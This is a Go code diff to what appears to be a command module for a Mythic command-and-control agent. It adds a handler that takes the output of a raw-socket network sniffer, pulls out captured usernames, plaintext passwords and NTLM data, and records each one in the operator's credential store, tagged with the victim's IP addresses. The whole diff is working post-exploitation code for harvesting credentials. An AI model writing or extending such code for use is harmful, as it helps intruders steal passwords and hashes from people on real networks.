@@ -1,7 +1,11 @@
 package agentfunctions
 
 import (
+	"encoding/json"
+	"fmt"
+
 	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
 func init() {
@@ -117,6 +121,55 @@ func init() {
 				response.DisplayParams = &displayParams
 			}
 			createArtifact(task.Task.ID, "Raw Socket", "AF_PACKET raw socket for network sniffing")
+			return response
+		},
+		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
+			response := agentstructs.PTTaskProcessResponseMessageResponse{TaskID: processResponse.TaskData.Task.ID, Success: true}
+			responseText, ok := processResponse.Response.(string)
+			if !ok || responseText == "" {
+				return response
+			}
+
+			// Parse the sniff result JSON to extract credentials
+			var result struct {
+				Credentials []struct {
+					Protocol string `json:"protocol"`
+					SrcIP    string `json:"src_ip"`
+					DstIP    string `json:"dst_ip"`
+					DstPort  uint16 `json:"dst_port"`
+					Username string `json:"username"`
+					Password string `json:"password,omitempty"`
+					Detail   string `json:"detail,omitempty"`
+				} `json:"credentials"`
+			}
+			if err := json.Unmarshal([]byte(responseText), &result); err != nil {
+				return response
+			}
+
+			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
+			for _, c := range result.Credentials {
+				credType := "plaintext"
+				credential := c.Password
+				if c.Protocol == "ntlm" {
+					credType = "hash"
+					credential = c.Detail // Contains host info
+				}
+				if credential == "" && c.Protocol != "ntlm" {
+					continue
+				}
+				realm := c.DstIP
+				if c.DstPort != 0 {
+					realm = fmt.Sprintf("%s:%d", c.DstIP, c.DstPort)
+				}
+				creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
+					CredentialType: credType,
+					Realm:          realm,
+					Account:        c.Username,
+					Credential:     credential,
+					Comment:        fmt.Sprintf("sniff: %s capture from %s", c.Protocol, c.SrcIP),
+				})
+			}
+			registerCredentials(processResponse.TaskData.Task.ID, creds)
 			return response
 		},
 	})
